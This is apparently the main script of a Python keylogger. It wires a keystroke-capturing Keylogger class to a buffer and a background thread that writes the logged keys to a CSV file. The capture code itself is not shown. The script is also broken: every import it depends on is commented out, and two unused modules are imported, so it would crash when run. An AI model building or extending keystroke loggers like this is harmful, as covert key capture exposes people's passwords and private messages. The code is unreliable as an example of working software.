#import sys
#import threading
#from buffer import Buffer
#from keylogger import Keylogger
#from writer import CsvWriter
from console import Console
from control import Control

def main() -> None:
    """
    The main-Method of the program
    """

    buffer = Buffer()
    keylogger = Keylogger(buffer)
    writer = CsvWriter(buffer)
    writer_thread = threading.Thread(target=writer.read_buffer)
    writer_thread.setDaemon(True)
    writer_thread.start()
    keylogger.start_logging()
    writer_thread.join()
    sys.exit()


if __name__ == "__main__":
    main()
